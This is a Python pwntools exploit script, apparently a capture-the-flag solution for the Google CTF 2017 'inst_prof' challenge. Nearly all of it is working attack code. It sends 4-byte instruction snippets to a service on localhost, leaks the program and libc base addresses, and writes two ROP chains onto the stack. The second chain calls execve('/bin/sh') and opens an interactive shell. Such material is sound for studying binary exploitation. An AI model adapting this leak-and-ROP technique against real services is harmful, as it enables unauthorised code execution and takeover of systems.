# -*- coding: utf-8 -*-
import struct
import sys
import subprocess
import socket
import telnetlib
import ctypes
import re
import errno
import time
from pwn import *

# pwntools - CTF framework
# defuse.ca - online x86 assembler
# https://khack40.info - writeup
# https://dilsec.com - google ctf 2017 pwnables inst_prof writeup
# WizardsOfDos' CTF writeup @ github

b = ELF('inst_prof')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

context.arch = 'amd64'
context.log_level = 'info'

r = remote('localhost', 8888)
#r = process('./inst_prof')
#gdb.attach(r, '''
#'''
#)
#raw_input('Go!')

# $ ROPgadget --binary inst_prof
#0x0000000000000bc3 : pop rdi ; ret
#0x0000000000000bc1 : pop rsi ; pop r15 ; ret

pop_rdi = 0x0000000000000bc3
pop_rsi = 0x0000000000000bc1 

def assemble(ASM):
    CODE = asm(ASM)
    if len(CODE) < 4:
        CODE += asm('ret')
    if len(CODE) < 4:
        CODE = CODE.ljust(4,asm('nop'))
    if len(CODE) > 4:
        print "More than 4 bytes", ASM
        sys.exit(1)
    return CODE

def hexify(x):
    return ":".join("{:02x}".format(ord(c)) for c in x)

if __name__ == "__main__":

    r.recvuntil('ready')

    # r14 := rsp (rsp : 돌아갈 주소, rdtsc 가 있는 CODE_BASE+0xb18)
    #r.send(asm('pop r14; push r14'))
    r.send(assemble('mov r14,[rsp]'))

    buf = r.recvn(8)
    #print "Response: 0x{:016x}".format(u64(buf)) # execution time of (pop r14; push r14) * 10000h

    # decrease r14 to 0x8a2 ( to point 'mov edx,6; mov edi,1; call _write' )
    buf = asm('dec r14\nret') * (0xb18 - 0x8a2)
    r.send(buf)
    time.sleep(1)
    r.clean()

    # leak r14
    # rsi == rsp - 8 ( [rsp-8] == CODE_BASE+0x8a2 )
    # [rsp] == r14 (CODE_BASE+0x8a2)
    r.send( asm('push rsp; pop rsi; push r14') )

    d = r.recvn(6)
    l = d + '\x00\x00'
    #l = d[len(d) - 6:len(d)] + '\x00\x00'
    l = u64(l)
    
    CODE_BASE = l - 0x8a2
    print "Leaked CODE_BASE: 0x{:016x}".format(CODE_BASE)

    # r14 := rsp
    r.send(asm('push rsp\npop r14\nret'))
    r.send(asm('inc r14\nret') * 56)
    # now, r14 points just above the stack frame of do_test()
    r.clean()

# leak the address of write@got
#
# mov rdi, 0
# jump to alarm@plt
# mov rdi, 1
# mov rsi, addr of write@got
# mov r15, 0
# jump to write@plt
# jump to code_base+0x8c7

    ROP = p64(CODE_BASE + pop_rdi)
    ROP += p64(0)
    ROP += p64(CODE_BASE + b.plt['alarm'])
    ROP += p64(CODE_BASE + pop_rdi)
    ROP += p64(1) # fd
    ROP += p64(CODE_BASE + pop_rsi)
    ROP += p64(CODE_BASE + b.got['write'])
    ROP += p64(0)
    ROP += p64(CODE_BASE + b.plt['write'])
    ROP += p64(CODE_BASE + 0x8c7) # main loop again

    print "length of ROP: %d" % len(ROP)
    for x in ROP:
        buf = asm('movb [r14], %#x' % ord(x))
        #print hexify(buf)
        r.send(buf)

        buf = asm('inc r14\nret')
        #print hexify(buf)
        r.send(buf)

    time.sleep(1)
    r.clean()

    r.send(asm('pop rax;pop rdx;push rax;ret'))

    d = ''
    while len(d) < 0x10: # read 16 bytes
        d += r.recvn(1)
    d = d[8:0x10] # discard first 8 bytes (execution time of 'pop rax;pop rdx;push rax;ret'
    l = u64(d)
    LIBC_BASE = l - libc.symbols['write']
    log.info('leak: %#x' % l)
    log.info('LIBC_BASE: %#x' % LIBC_BASE)

    #pause()

    # now ROP stage 2
    r.send(asm('push rsp\npop r14\nret'))
    r.send(asm('inc r14\nret') * 56)
    # now, r14 points just above the stack frame of do_test()
    r.clean()

# mov rdi, "/bin/sh"
# mov rsi, 0
# mov rdx, 0
# call execve
# mov rdi, 0
# call exit

    ROP = p64(CODE_BASE + pop_rdi)
    ROP += p64(LIBC_BASE + libc.search('/bin/sh').next())
    ROP += p64(CODE_BASE + pop_rsi)
    ROP += p64(0)
    ROP += p64(0)
    ROP += p64(LIBC_BASE + libc.search(asm('pop rdx; ret')).next())
    ROP += p64(0)
    ROP += p64(LIBC_BASE + libc.symbols['execve'])
    ROP += p64(CODE_BASE + pop_rdi)
    ROP += p64(0)
    ROP += p64(LIBC_BASE + libc.symbols['_exit'])

    print "length of ROP: %d" % len(ROP)
    for x in ROP:
        buf = asm('movb [r14], %#x' % ord(x))
        #print hexify(buf)
        r.send(buf)

        buf = asm('inc r14; ret')
        #print hexify(buf)
        r.send(buf)

    r.send(asm('pop rax; pop rdx; push rax; ret'))
    r.clean()

    r.interactive()
    r.close()

    sys.exit(0)
